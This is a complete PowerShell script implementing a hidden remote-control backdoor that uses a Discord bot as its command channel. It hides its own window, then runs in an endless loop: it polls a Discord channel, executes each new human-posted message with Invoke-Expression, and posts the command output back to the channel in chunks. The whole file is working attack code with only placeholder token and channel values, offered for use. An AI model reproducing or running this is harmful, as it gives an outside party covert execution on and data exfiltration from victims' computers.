
# === Configuration ===
$t = ""     #  Replace with your actual bot token
$c = ""            #  Replace with your actual Discord channel ID

# === Hide PowerShell Window (from my testing didnt work that much, maybe a w11 thing?)===
$a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$h = (Get-Process -Id $PID).MainWindowHandle
[Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($h, 0)

# === sends output message to Discord ===
function Send-DiscordMessage {
    $w.Headers["Content-Type"] = "application/json"
    $body = @{
        content = "``````$($b -join "`n")``````"
    } | ConvertTo-Json -Depth 3
    $w.UploadString($u, "POST", $body) | Out-Null
}

# === reply to this ===
$w = New-Object System.Net.WebClient
$w.Headers.Add("Authorization", "Bot $t")
$w.Headers["Content-Type"] = "application/json"

$u = "https://discord.com/api/v10/channels/$c/messages"
$body = @{ content = "1" } | ConvertTo-Json -Depth 3
$w.UploadString($u, "POST", $body) | Out-Null



# === main command===
$p = ""
while ($true) {
    try {
        $u = "https://discord.com/api/v10/channels/$c/messages"
        $w = New-Object System.Net.WebClient
        $w.Headers.Add("Authorization", "Bot $t")

        $resp = $w.DownloadString($u)
        $msgs = $resp | ConvertFrom-Json
        $r = $msgs | Where-Object { -not $_.author.bot } | Select-Object -First 1

        if ($r) {
            $a = $r.timestamp
            $m = $r.content
        }

        if ($a -ne $p -and $m) {
            $p = $a
            Write-Output "Executing: $m"
	Write-Output "Output: $o"

            $o = iex $m 2>&1  
            $l = $o -split "`n"
            $s = 0
            $b = @()

            foreach ($z in $l) {
                $y = [System.Text.Encoding]::Unicode.GetByteCount($z)
                if (($s + $y) -gt 1900) {
                    Send-DiscordMessage
                    Start-Sleep 1
                    $s = 0
                    $b = @()
                }
                $b += $z
                $s += $y
            }

            if ($b.Count -gt 0) {
                Send-DiscordMessage
            }
        }

        Start-Sleep 3
    }
    catch {
        Write-Output "Error: $_"
        Start-Sleep 5
    }
}
